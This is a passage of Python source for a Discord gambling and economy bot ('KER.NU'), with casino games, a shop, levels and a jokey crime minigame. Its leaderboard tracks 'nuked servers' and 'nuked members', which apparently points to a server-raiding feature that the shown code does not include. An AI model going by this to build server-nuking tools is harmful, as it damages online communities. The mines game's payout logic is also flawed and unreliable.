            result_text += f"\n😢 **Wrong number!**"
            result_color = 0xff0000
    elif bet_type.lower() in ["red", "black"]:
        if bet_type.lower() == winning_color:
            winnings = bet_amount
            result_text += f"\n🎉 **COLOR MATCH!**"
            result_color = 0x00ff00
        else:
            winnings = -bet_amount
            result_text += f"\n😢 **Wrong color!**"
            result_color = 0xff0000
    elif bet_type.lower() in ["even", "odd"]:
        if winning_number == 0:
            winnings = -bet_amount
            result_text += f"\n💚 **House wins on 0!**"
            result_color = 0x00ff00
        elif (bet_type.lower() == "even" and winning_number % 2 == 0) or (bet_type.lower() == "odd" and winning_number % 2 == 1):
            winnings = bet_amount
            result_text += f"\n🎉 **Correct guess!**"
            result_color = 0x00ff00
        else:
            winnings = -bet_amount
            result_text += f"\n😢 **Wrong guess!**"
            result_color = 0xff0000
    else:
        return await ctx.reply("Invalid bet type! Use: red, black, even, odd, or number")

    new_balance = await economy.update_balance(ctx.author.id, winnings)

    # Show final dramatic result
    embed = discord.Embed(title="🎡 ROULETTE RESULTS 🎡", color=result_color)
    embed.add_field(name="🎯 Winning Number", value=f"**{color_emoji} {winning_number} {color_emoji}**", inline=True)
    embed.add_field(name="🎨 Color", value=f"**{winning_color.upper()}**", inline=True)
    embed.add_field(name="📊 Result", value=result_text, inline=False)
    
    if winnings > 0:
        if winnings >= bet_amount * 20:
            embed.add_field(name="💎 MEGA JACKPOT! 💎", value=f"🎉 **+{winnings} coins** 🎉", inline=True)
            embed.set_footer(text="💎 KER.NU Casino - MEGA JACKPOT WINNER! 💎")
        else:
            embed.add_field(name="🎉 WINNER! 🎉", value=f"💰 **+{winnings} coins**", inline=True)
            embed.set_footer(text="🎉 KER.NU Casino - Lucky spin! 🎉")
    else:
        embed.add_field(name="💸 Lost", value=f"**{abs(winnings)} coins**", inline=True)
        embed.set_footer(text="🎡 KER.NU Casino - Spin again for better luck! 🎡")
    
    embed.add_field(name="💳 New Balance", value=f"💰 **{new_balance} coins**", inline=True)
    await message.edit(embed=embed)

@bot.command(name="dice")
async def dice_game(ctx, bet_amount: int = None, guess: int = None):
    if bet_amount is None or guess is None:
        embed = discord.Embed(title="🎲 Dice Game", description="Usage: `$kernu dice <amount> <guess 1-6>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    if guess < 1 or guess > 6:
        return await ctx.reply("Guess must be between 1 and 6!")

    # Create initial rolling animation
    embed = discord.Embed(title="🎲 KER.NU DICE GAME 🎲", color=0x00ffff)
    embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
    embed.add_field(name="🎯 Your Guess", value=f"**{guess}**", inline=True)
    embed.add_field(name="📊 Status", value="🔄 **ROLLING DICE...**", inline=False)
    embed.add_field(name="🎲 Dice", value="🔄 🔄", inline=False)
    embed.set_footer(text="🎲 KER.NU Casino - Rolling the dice... 🎲")
    
    message = await ctx.reply(embed=embed)

    # Dice rolling animation frames
    dice_faces = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
    roll_frames = [
        ["🔄", "🔄"],
        ["🌀", "🌀"],
        ["💫", "💫"],
        ["⚡", "⚡"],
        [random.choice(dice_faces), random.choice(dice_faces)],
        [random.choice(dice_faces), random.choice(dice_faces)],
        [random.choice(dice_faces), random.choice(dice_faces)]
    ]
    
    # Show rolling animation
    for i, frame in enumerate(roll_frames):
        embed = discord.Embed(title="🎲 KER.NU DICE GAME 🎲", color=0x00ffff)
        embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
        embed.add_field(name="🎯 Your Guess", value=f"**{guess}**", inline=True)
        
        if i < 4:
            embed.add_field(name="📊 Status", value="🔄 **ROLLING DICE...**", inline=False)
        else:
            embed.add_field(name="📊 Status", value="⏳ **DICE BOUNCING...**", inline=False)
            
        embed.add_field(name="🎲 Dice", value=f"**{frame[0]} {frame[1]}**", inline=False)
        embed.set_footer(text="🎲 KER.NU Casino - Rolling the dice... 🎲")
        
        await message.edit(embed=embed)
        await asyncio.sleep(0.9)

    # Generate final dice rolls
    roll1 = random.randint(1, 6)
    roll2 = random.randint(1, 6)
    dice1_face = dice_faces[roll1 - 1]
    dice2_face = dice_faces[roll2 - 1]
    total = roll1 + roll2

    # Show final settling animation
    embed = discord.Embed(title="🎲 KER.NU DICE GAME 🎲", color=0x00ffff)
    embed.add_field(name="💰 Your Bet", value=f"**{bet_amount} coins**", inline=True)
    embed.add_field(name="🎯 Your Guess", value=f"**{guess}**", inline=True)
    embed.add_field(name="📊 Status", value="🎯 **DICE SETTLED!**", inline=False)
    embed.add_field(name="🎲 Final Roll", value=f"**{dice1_face} {dice2_face}**", inline=False)
    embed.set_footer(text="🎲 KER.NU Casino - Final result! 🎲")
    
    await message.edit(embed=embed)
    await asyncio.sleep(1.5)

    # Calculate winnings
    winnings = 0
    if guess == roll1 or guess == roll2:
        if guess == roll1 and guess == roll2:
            winnings = bet_amount * 10  # Both dice match
            result_text = f"🎯 **DOUBLE MATCH!** Both dice rolled **{guess}**!"
            result_color = 0xffd700
        else:
            winnings = bet_amount * 3  # One die matches
            result_text = f"🎉 **SINGLE MATCH!** One die rolled **{guess}**!"
            result_color = 0x00ff00
    else:
        winnings = -bet_amount
        result_text = f"😢 **NO MATCHES** - You guessed **{guess}**"
        result_color = 0xff0000

    new_balance = await economy.update_balance(ctx.author.id, winnings)

    # Show dramatic final result
    embed = discord.Embed(title="🎲 DICE GAME RESULTS 🎲", color=result_color)
    embed.add_field(name="🎯 Final Dice", value=f"**{dice1_face} {dice2_face}**", inline=True)
    embed.add_field(name="🔢 Numbers", value=f"**{roll1} & {roll2}** (Total: {total})", inline=True)
    embed.add_field(name="📊 Result", value=result_text, inline=False)
    
    if winnings > 0:
        if winnings >= bet_amount * 10:
            embed.add_field(name="💎 MEGA WIN! 💎", value=f"🎉 **+{winnings} coins** 🎉", inline=True)
            embed.set_footer(text="💎 KER.NU Casino - DOUBLE MATCH WINNER! 💎")
        else:
            embed.add_field(name="🎉 WINNER! 🎉", value=f"💰 **+{winnings} coins**", inline=True)
            embed.set_footer(text="🎉 KER.NU Casino - Lucky roll! 🎉")
    else:
        embed.add_field(name="💸 Lost", value=f"**{abs(winnings)} coins**", inline=True)
        embed.set_footer(text="🎲 KER.NU Casino - Roll again for better luck! 🎲")
    
    embed.add_field(name="💳 New Balance", value=f"💰 **{new_balance} coins**", inline=True)
    await message.edit(embed=embed)

@bot.command(name="lottery")
async def lottery(ctx):
    user_id = str(ctx.author.id)
    current_time = int(time.time())
    
    if user_id not in config['users']:
        await economy.get_balance(ctx.author.id)

    # Check if user already bought lottery ticket today
    last_lottery = int(config[user_id].get('last_lottery', 0))
    if current_time - last_lottery < 86400:  # 24 hours
        time_left = 86400 - (current_time - last_lottery)
        hours = time_left // 3600
        minutes = (time_left % 3600) // 60
        return await ctx.reply(f"You already bought a lottery ticket today! Next lottery in {hours}h {minutes}m")

    user_balance = await economy.get_balance(ctx.author.id)
    ticket_price = 100

    if user_balance < ticket_price:
        return await ctx.reply(f"You need {ticket_price} coins to buy a lottery ticket! Your balance: {user_balance}")

    # Deduct ticket price
    await economy.update_balance(ctx.author.id, -ticket_price)
    
    # Generate lottery numbers
    user_numbers = random.sample(range(1, 50), 6)
    winning_numbers = random.sample(range(1, 50), 6)
    
    matches = len(set(user_numbers) & set(winning_numbers))
    
    # Calculate prize based on matches
    prize = 0
    if matches == 6:
        prize = 50000  # Jackpot!
    elif matches == 5:
        prize = 5000
    elif matches == 4:
        prize = 500
    elif matches == 3:
        prize = 150
    elif matches == 2:
        prize = 50

    if prize > 0:
        new_balance = await economy.update_balance(ctx.author.id, prize)
    else:
        new_balance = await economy.get_balance(ctx.author.id)

    # Update last lottery time
    config[user_id]['last_lottery'] = str(current_time)
    with open('database.ini', 'w') as configfile:
        config.write(configfile)

    embed = discord.Embed(title="🎫 Daily Lottery Results", color=0xffd700 if prize > 0 else 0xff0000)
    embed.add_field(name="Your Numbers", value=" ".join(map(str, sorted(user_numbers))), inline=True)
    embed.add_field(name="Winning Numbers", value=" ".join(map(str, sorted(winning_numbers))), inline=True)
    embed.add_field(name="Matches", value=f"{matches}/6", inline=True)
    
    if prize > 0:
        if matches == 6:
            embed.add_field(name="🎉 JACKPOT!", value=f"💰 +{prize} coins", inline=False)
        else:
            embed.add_field(name="🎉 Winner!", value=f"💰 +{prize} coins", inline=False)
    else:
        embed.add_field(name="😢 Better luck tomorrow!", value="No matches", inline=False)
    
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="shop")
async def shop(ctx, item: str = None, amount: int = 1):
    if item is None:
        embed = discord.Embed(title="🛒 KER.NU Shop", color=0x00ff00)
        embed.add_field(name="Items Available", value="""
        💎 `premium` - 10,000 coins - Premium features for 7 days
        🎲 `lucky_dice` - 500 coins - Increases dice game odds
        🎰 `slot_boost` - 1,000 coins - Better slot machine odds
        🍀 `lucky_charm` - 2,000 coins - +50% daily reward bonus
        ⚡ `speed_boost` - 300 coins - Faster cooldowns
        """, inline=False)
        embed.add_field(name="Usage", value="`$kernu shop <item> [amount]`", inline=False)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)
    user_id = str(ctx.author.id)

    # Shop items with prices
    shop_items = {
        "premium": {"price": 10000, "name": "💎 Premium Access"},
        "lucky_dice": {"price": 500, "name": "🎲 Lucky Dice"},
        "slot_boost": {"price": 1000, "name": "🎰 Slot Boost"},
        "lucky_charm": {"price": 2000, "name": "🍀 Lucky Charm"},
        "speed_boost": {"price": 300, "name": "⚡ Speed Boost"}
    }

    if item not in shop_items:
        return await ctx.reply("Item not found! Use `$kernu shop` to see available items.")

    total_cost = shop_items[item]["price"] * amount

    if user_balance < total_cost:
        return await ctx.reply(f"You need {total_cost} coins to buy {amount}x {shop_items[item]['name']}! Your balance: {user_balance}")

    # Deduct cost
    new_balance = await economy.update_balance(ctx.author.id, -total_cost)

    # Add item to user's inventory (simplified)
    if 'inventory' not in config[user_id]:
        config[user_id]['inventory'] = "{}"
    
    inventory = json.loads(config[user_id]['inventory'])
    if item in inventory:
        inventory[item] += amount
    else:
        inventory[item] = amount
    
    config[user_id]['inventory'] = json.dumps(inventory)
    with open('database.ini', 'w') as configfile:
        config.write(configfile)

    embed = discord.Embed(title="🛒 Purchase Successful!", color=0x00ff00)
    embed.add_field(name="Item", value=shop_items[item]["name"], inline=True)
    embed.add_field(name="Quantity", value=amount, inline=True)
    embed.add_field(name="Total Cost", value=f"💰 {total_cost} coins", inline=True)
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="inventory")
async def inventory(ctx):
    user_id = str(ctx.author.id)
    
    if user_id not in config['users']:
        await economy.get_balance(ctx.author.id)

    if 'inventory' not in config[user_id]:
        config[user_id]['inventory'] = "{}"
        with open('database.ini', 'w') as configfile:
            config.write(configfile)

    inventory = json.loads(config[user_id]['inventory'])
    
    if not inventory:
        return await ctx.reply("Your inventory is empty! Visit the shop to buy items.")

    embed = discord.Embed(title=f"🎒 {ctx.author.name}'s Inventory", color=0x00ff00)
    
    shop_names = {
        "premium": "💎 Premium Access",
        "lucky_dice": "🎲 Lucky Dice", 
        "slot_boost": "🎰 Slot Boost",
        "lucky_charm": "🍀 Lucky Charm",
        "speed_boost": "⚡ Speed Boost"
    }
    
    for item, quantity in inventory.items():
        item_name = shop_names.get(item, item)
        embed.add_field(name=item_name, value=f"Quantity: {quantity}", inline=True)
    
    await ctx.reply(embed=embed)

@bot.command(name="give")
async def give_money(ctx, user: discord.Member = None, amount: int = None):
    if user is None or amount is None:
        embed = discord.Embed(title="💰 Give Money", description="Usage: `$kernu give <@user> <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    if user.id == ctx.author.id:
        return await ctx.reply("❌ You can't give money to yourself!")

    if user.bot:
        return await ctx.reply("❌ You can't give money to bots!")

    if amount <= 0:
        return await ctx.reply("❌ Amount must be positive!")

    giver_balance = await economy.get_balance(ctx.author.id)
    
    # Owner has unlimited coins, so they can give any amount
    if str(ctx.author.id) not in owners and amount > giver_balance:
        return await ctx.reply(f"❌ You don't have enough coins! Your balance: {giver_balance}")

    # Update balances
    if str(ctx.author.id) not in owners:  # Only deduct if not owner
        await economy.update_balance(ctx.author.id, -amount)
    await economy.update_balance(user.id, amount)

    giver_new_balance = await economy.get_balance(ctx.author.id)
    receiver_new_balance = await economy.get_balance(user.id)

    embed = discord.Embed(title="💰 Money Transfer Complete", color=0x00ff00)
    embed.add_field(name="From", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="To", value=f"{user.mention}", inline=True)
    embed.add_field(name="Amount", value=f"💰 {amount} coins", inline=True)
    
    if str(ctx.author.id) in owners:
        embed.add_field(name="Giver Balance", value="💰 ∞ UNLIMITED (OWNER)", inline=True)
    else:
        embed.add_field(name="Giver Balance", value=f"💰 {giver_new_balance} coins", inline=True)
    
    embed.add_field(name="Receiver Balance", value=f"💰 {receiver_new_balance} coins", inline=True)
    embed.set_footer(text="🏢 Kernu Inc. - Money Transfer System")
    
    await ctx.reply(embed=embed)

# Enhanced Gaming Features
@bot.command(name="poker")
async def poker(ctx, bet_amount: int = None):
    if bet_amount is None:
        embed = discord.Embed(title="🃏 Poker", description="Usage: `$kernu poker <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Generate poker hand
    suits = ['♠️', '♥️', '♦️', '♣️']
    ranks = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K']
    
    def create_card():
        return f"{random.choice(ranks)}{random.choice(suits)}"
    
    hand = [create_card() for _ in range(5)]
    
    # Simple poker hand evaluation
    hand_ranks = [card[:-2] if len(card) == 4 else card[:-1] for card in hand]
    hand_suits = [card[-2:] for card in hand]
    
    # Count occurrences
    rank_counts = {}
    for rank in hand_ranks:
        rank_counts[rank] = rank_counts.get(rank, 0) + 1
    
    counts = sorted(rank_counts.values(), reverse=True)
    is_flush = len(set(hand_suits)) == 1
    
    # Determine hand type
    if counts == [4, 1]:
        hand_type = "Four of a Kind"
        multiplier = 25
    elif counts == [3, 2]:
        hand_type = "Full House"
        multiplier = 10
    elif is_flush:
        hand_type = "Flush"
        multiplier = 6
    elif counts == [3, 1, 1]:
        hand_type = "Three of a Kind"
        multiplier = 4
    elif counts == [2, 2, 1]:
        hand_type = "Two Pair"
        multiplier = 3
    elif counts == [2, 1, 1, 1]:
        hand_type = "Pair"
        multiplier = 2
    else:
        hand_type = "High Card"
        multiplier = 0

    winnings = int(bet_amount * multiplier) - bet_amount
    new_balance = await economy.update_balance(ctx.author.id, winnings)

    embed = discord.Embed(title="🃏 Poker Results", color=0xffd700 if winnings > 0 else 0xff0000)
    embed.add_field(name="Your Hand", value=" ".join(hand), inline=False)
    embed.add_field(name="Hand Type", value=hand_type, inline=True)
    
    if winnings > 0:
        embed.add_field(name="🎉 Winnings", value=f"💰 +{winnings} coins", inline=True)
    else:
        embed.add_field(name="💸 Lost", value=f"{bet_amount} coins", inline=True)
    
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="crash")
async def crash_game(ctx, bet_amount: int = None, cash_out: float = None):
    if bet_amount is None or cash_out is None:
        embed = discord.Embed(title="📈 Crash Game", description="Usage: `$kernu crash <amount> <cash_out_multiplier>`\nExample: `$kernu crash 100 2.5`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    if cash_out < 1.0:
        return await ctx.reply("Cash out multiplier must be at least 1.0!")

    # Generate crash point
    crash_point = random.uniform(1.0, 10.0)
    
    # Animation
    embed = discord.Embed(title="📈 KER.NU Crash Game", color=0x00ffff)
    embed.add_field(name="💰 Your Bet", value=f"{bet_amount} coins", inline=True)
    embed.add_field(name="🎯 Cash Out At", value=f"{cash_out}x", inline=True)
    embed.add_field(name="📊 Status", value="🚀 Rocket launching...", inline=False)
    
    message = await ctx.reply(embed=embed)

    # Show multiplier climbing
    current_mult = 1.0
    while current_mult < min(crash_point, cash_out + 0.5):
        current_mult += 0.1
        embed = discord.Embed(title="📈 KER.NU Crash Game", color=0x00ffff)
        embed.add_field(name="💰 Your Bet", value=f"{bet_amount} coins", inline=True)
        embed.add_field(name="🎯 Cash Out At", value=f"{cash_out}x", inline=True)
        embed.add_field(name="🚀 Current Multiplier", value=f"**{current_mult:.1f}x**", inline=False)
        
        if current_mult >= cash_out:
            embed.add_field(name="💰 Potential Win", value=f"💰 {int(bet_amount * cash_out)} coins", inline=True)
        
        await message.edit(embed=embed)
        await asyncio.sleep(0.3)

    # Determine result
    if cash_out <= crash_point:
        # Win
        winnings = int(bet_amount * cash_out)
        new_balance = await economy.update_balance(ctx.author.id, winnings - bet_amount)
        
        embed = discord.Embed(title="📈 Crash Game - WIN!", color=0x00ff00)
        embed.add_field(name="🚀 Crash Point", value=f"{crash_point:.2f}x", inline=True)
        embed.add_field(name="💰 Cashed Out At", value=f"{cash_out}x", inline=True)
        embed.add_field(name="🎉 Winnings", value=f"💰 +{winnings - bet_amount} coins", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 {new_balance} coins", inline=True)
    else:
        # Lose
        new_balance = await economy.update_balance(ctx.author.id, -bet_amount)
        
        embed = discord.Embed(title="📈 Crash Game - CRASHED!", color=0xff0000)
        embed.add_field(name="💥 Crash Point", value=f"{crash_point:.2f}x", inline=True)
        embed.add_field(name="😢 Target", value=f"{cash_out}x", inline=True)
        embed.add_field(name="💸 Lost", value=f"{bet_amount} coins", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 {new_balance} coins", inline=True)

    await message.edit(embed=embed)

@bot.command(name="mines")
async def mines_game(ctx, bet_amount: int = None, mines: int = 3):
    if bet_amount is None:
        embed = discord.Embed(title="💣 Mines Game", description="Usage: `$kernu mines <amount> [mines_count]`\nDefault mines: 3", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    if mines < 1 or mines > 20:
        return await ctx.reply("Mines count must be between 1 and 20!")

    # Create minefield
    total_tiles = 25
    mine_positions = random.sample(range(total_tiles), mines)
    
    # Player picks random tiles
    picks = random.randint(1, min(8, total_tiles - mines))
    safe_tiles = [i for i in range(total_tiles) if i not in mine_positions]
    picked_tiles = random.sample(safe_tiles, picks)
    
    # Calculate multiplier based on picks and mines
    base_multiplier = 1.0
    for i in range(picks):
        remaining_safe = total_tiles - mines - i
        remaining_total = total_tiles - i
        base_multiplier *= remaining_total / remaining_safe
    
    multiplier = base_multiplier * 0.97  # House edge
    
    # Show results
    embed = discord.Embed(title="💣 Mines Game Results", color=0x00ff00)
    embed.add_field(name="💰 Bet Amount", value=f"{bet_amount} coins", inline=True)
    embed.add_field(name="💣 Mines", value=f"{mines}", inline=True)
    embed.add_field(name="✅ Safe Picks", value=f"{picks}", inline=True)
    embed.add_field(name="📈 Multiplier", value=f"{multiplier:.2f}x", inline=True)
    
    winnings = int(bet_amount * multiplier) - bet_amount
    new_balance = await economy.update_balance(ctx.author.id, winnings)
    
    embed.add_field(name="🎉 Winnings", value=f"💰 +{winnings} coins", inline=True)
    embed.add_field(name="💳 New Balance", value=f"💰 {new_balance} coins", inline=True)
    
    await ctx.reply(embed=embed)

# Leveling System
class LevelSystem:
    @staticmethod
    async def get_user_xp(user_id):
        user_id = str(user_id)
        if user_id not in config['users']:
            await economy.get_balance(user_id)
        return int(config[user_id].get('xp', 0))
    
    @staticmethod
    async def add_xp(user_id, amount):
        user_id = str(user_id)
        if user_id not in config['users']:
            await economy.get_balance(user_id)
        
        current_xp = int(config[user_id].get('xp', 0))
        new_xp = current_xp + amount
        config[user_id]['xp'] = str(new_xp)
        
        with open('database.ini', 'w') as configfile:
            config.write(configfile)
        
        return new_xp
    
    @staticmethod
    def calculate_level(xp):
        return int((xp / 100) ** 0.5) + 1
    
    @staticmethod
    def xp_for_next_level(level):
        return ((level) ** 2) * 100

@bot.command(name="level")
async def level_command(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author
    
    xp = await LevelSystem.get_user_xp(user.id)
    level = LevelSystem.calculate_level(xp)
    next_level_xp = LevelSystem.xp_for_next_level(level)
    xp_needed = next_level_xp - xp
    
    embed = discord.Embed(title=f"📊 Level Stats - {user.name}", color=0x00ff00)
    embed.add_field(name="Level", value=f"🌟 {level}", inline=True)
    embed.add_field(name="XP", value=f"⭐ {xp}", inline=True)
    embed.add_field(name="XP to Next Level", value=f"🎯 {xp_needed}", inline=True)
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)
    
    await ctx.reply(embed=embed)

@bot.command(name="work")
async def work(ctx):
    user_id = str(ctx.author.id)
    current_time = int(time.time())
    
    if user_id not in config['users']:
        await economy.get_balance(ctx.author.id)
    
    last_work = int(config[user_id].get('last_work', 0))
    
    if current_time - last_work < 3600:  # 1 hour cooldown
        time_left = 3600 - (current_time - last_work)
        minutes = time_left // 60
        return await ctx.reply(f"⏰ You need to wait {minutes} minutes before working again!")
    
    # Work rewards
    work_options = [
        {"job": "💼 Office Worker", "pay": (50, 150)},
        {"job": "🚚 Delivery Driver", "pay": (75, 200)},
        {"job": "👨‍💻 Programmer", "pay": (100, 300)},
        {"job": "🎨 Artist", "pay": (60, 180)},
        {"job": "🏪 Shop Clerk", "pay": (40, 120)},
        {"job": "🚗 Uber Driver", "pay": (70, 190)}
    ]
    
    chosen_work = random.choice(work_options)
    pay = random.randint(*chosen_work["pay"])
    xp_gain = random.randint(10, 25)
    
    new_balance = await economy.update_balance(ctx.author.id, pay)
    new_xp = await LevelSystem.add_xp(ctx.author.id, xp_gain)
    new_level = LevelSystem.calculate_level(new_xp)
    
    config[user_id]['last_work'] = str(current_time)
    with open('database.ini', 'w') as configfile:
        config.write(configfile)
    
    embed = discord.Embed(title="💼 Work Complete!", color=0x00ff00)
    embed.add_field(name="Job", value=chosen_work["job"], inline=True)
    embed.add_field(name="Pay", value=f"💰 +{pay} coins", inline=True)
    embed.add_field(name="XP Gained", value=f"⭐ +{xp_gain} XP", inline=True)
    embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    embed.add_field(name="Level", value=f"🌟 {new_level}", inline=True)
    
    await ctx.reply(embed=embed)

@bot.command(name="crime")
async def crime(ctx):
    user_id = str(ctx.author.id)
    current_time = int(time.time())
    
    if user_id not in config['users']:
        await economy.get_balance(ctx.author.id)
    
    last_crime = int(config[user_id].get('last_crime', 0))
    
    if current_time - last_crime < 7200:  # 2 hour cooldown
        time_left = 7200 - (current_time - last_crime)
        hours = time_left // 3600
        minutes = (time_left % 3600) // 60
        return await ctx.reply(f"🚨 You need to lay low for {hours}h {minutes}m before committing another crime!")
    
    # Crime scenarios
    crimes = [
        {"crime": "🏪 Robbed a convenience store", "success_rate": 0.7, "reward": (200, 500), "fine": (100, 300)},
        {"crime": "💳 Credit card fraud", "success_rate": 0.6, "reward": (300, 800), "fine": (200, 500)},
        {"crime": "🏦 Bank heist", "success_rate": 0.3, "reward": (1000, 3000), "fine": (500, 1000)},
        {"crime": "🚗 Car theft", "success_rate": 0.5, "reward": (400, 1000), "fine": (250, 600)},
        {"crime": "💎 Jewelry heist", "success_rate": 0.4, "reward": (600, 1500), "fine": (300, 700)}
    ]
    
    chosen_crime = random.choice(crimes)
    success = random.random() < chosen_crime["success_rate"]
    
    if success:
        reward = random.randint(*chosen_crime["reward"])
        xp_gain = random.randint(15, 30)
        new_balance = await economy.update_balance(ctx.author.id, reward)
        new_xp = await LevelSystem.add_xp(ctx.author.id, xp_gain)
        
        embed = discord.Embed(title="🎭 Crime Successful!", color=0x00ff00)
        embed.add_field(name="Crime", value=chosen_crime["crime"], inline=False)
        embed.add_field(name="Reward", value=f"💰 +{reward} coins", inline=True)
        embed.add_field(name="XP Gained", value=f"⭐ +{xp_gain} XP", inline=True)
        embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    else:
        fine = random.randint(*chosen_crime["fine"])
        new_balance = await economy.update_balance(ctx.author.id, -fine)
        
        embed = discord.Embed(title="🚨 Crime Failed!", color=0xff0000)
        embed.add_field(name="Crime", value=chosen_crime["crime"], inline=False)
        embed.add_field(name="Fine", value=f"💸 -{fine} coins", inline=True)
        embed.add_field(name="New Balance", value=f"💰 {new_balance} coins", inline=True)
    
    config[user_id]['last_crime'] = str(current_time)
    with open('database.ini', 'w') as configfile:
        config.write(configfile)
    
    await ctx.reply(embed=embed)

@bot.command(name="top")
async def leaderboard_top(ctx, category: str = "coins"):
    valid_categories = ["coins", "xp", "level", "nuked_servers", "nuked_members"]
    
    if category not in valid_categories:
        return await ctx.reply(f"Invalid category! Valid options: {', '.join(valid_categories)}")
    
    users_data = []
    
    for user_id in config['users']:
        if user_id == "users":
            continue
        
        user_data = config[user_id]
        
        if category == "coins":
            value = int(user_data.get('coins', 0))
        elif category == "xp":
            value = int(user_data.get('xp', 0))
        elif category == "level":
            xp = int(user_data.get('xp', 0))
            value = LevelSystem.calculate_level(xp)
        elif category == "nuked_servers":
            value = int(user_data.get('nuked_server', 0))
        elif category == "nuked_members":
            value = int(user_data.get('nuked_member', 0))
        
        users_data.append((user_id, value))
    
    users_data.sort(key=lambda x: x[1], reverse=True)
    top_10 = users_data[:10]
    
    embed = discord.Embed(title=f"🏆 Top 10 - {category.title()}", color=0xffd700)
    
    for i, (user_id, value) in enumerate(top_10, 1):
        try:
            user = await bot.fetch_user(int(user_id))
            username = user.name
        except:
            username = f"User {user_id}"
        
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        
        if category in ["coins", "xp", "nuked_servers", "nuked_members"]:
            embed.add_field(name=f"{medal} {username}", value=f"{value:,}", inline=False)
        else:
            embed.add_field(name=f"{medal} {username}", value=f"Level {value}", inline=False)
    
    await ctx.reply(embed=embed)

# New Enhanced Commands
@bot.command(name="server_info")
async def server_info_command(ctx):
    """Get detailed server information and analytics"""
    analytics = await AdvancedFeatures.server_analytics(ctx.guild)
    
    if not analytics:
        return await ctx.reply("❌ Failed to get server analytics")
    
    embed = discord.Embed(title=f"📊 Server Analytics - {ctx.guild.name}", color=0x00ff00)
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    
    embed.add_field(name="👥 Members", value=f"**{analytics['total_members']:,}** total\n**{analytics['humans']:,}** humans\n**{analytics['bots']:,}** bots", inline=True)
    embed.add_field(name="🟢 Online", value=f"**{analytics['online']:,}** members", inline=True)
    embed.add_field(name="📺 Channels", value=f"**{analytics['text_channels']}** text\n**{analytics['voice_channels']}** voice", inline=True)
    embed.add_field(name="🎭 Roles", value=f"**{analytics['roles']}** roles", inline=True)
    embed.add_field(name="💎 Boosts", value=f"Level **{analytics['boost_level']}**\n**{analytics['boost_count']}** boosts", inline=True)
    embed.add_field(name="📅 Created", value=ctx.guild.created_at.strftime("%Y-%m-%d"), inline=True)
    
    embed.set_footer(text="🏢 Kernu Inc. - Advanced Server Analytics")
    await ctx.reply(embed=embed)

@bot.command(name="heist")
async def heist_game(ctx, bet_amount: int = None):
    """Advanced heist gambling game with team mechanics"""
    if bet_amount is None:
        embed = discord.Embed(title="🏦 Bank Heist", description="Usage: `kernu heist <amount>`", color=0xff0000)
        return await ctx.reply(embed=embed)

    user_balance = await economy.get_balance(ctx.author.id)

    if bet_amount <= 0:
        return await ctx.reply("Bet amount must be positive!")

    if bet_amount > user_balance:
        return await ctx.reply(f"You don't have enough coins! Your balance: {user_balance}")

    # Heist scenarios with different success rates and payouts
    heist_types = [
        {"name": "🏪 Corner Store", "difficulty": 0.8, "payout": 1.5, "time": "2 minutes"},
        {"name": "🏦 Local Bank", "difficulty": 0.6, "payout": 3.0, "time": "15 minutes"},
        {"name": "💎 Jewelry Store", "difficulty": 0.4, "payout": 5.0, "time": "30 minutes"},
        {"name": "🏛️ Federal Reserve", "difficulty": 0.2, "payout": 10.0, "time": "2 hours"},
        {"name": "🎰 Casino Vault", "difficulty": 0.1, "payout": 20.0, "time": "4 hours"}
    ]
    
    chosen_heist = random.choice(heist_types)
    
    # Create planning phase
    embed = discord.Embed(title="🕵️ Heist Planning Phase", color=0xffff00)
    embed.add_field(name="🎯 Target", value=chosen_heist["name"], inline=True)
    embed.add_field(name="💰 Investment", value=f"{bet_amount} coins", inline=True)
    embed.add_field(name="⏱️ Duration", value=chosen_heist["time"], inline=True)
    embed.add_field(name="📊 Success Rate", value=f"{int(chosen_heist['difficulty'] * 100)}%", inline=True)
    embed.add_field(name="💵 Potential Payout", value=f"{chosen_heist['payout']}x", inline=True)
    embed.add_field(name="🚨 Status", value="🔄 **EXECUTING HEIST...**", inline=False)
    
    message = await ctx.reply(embed=embed)
    
    # Heist execution animation
    phases = ["🔓 Disabling alarms...", "🚪 Breaking in...", "💰 Accessing vault...", "🏃 Making escape..."]
    
    for i, phase in enumerate(phases):
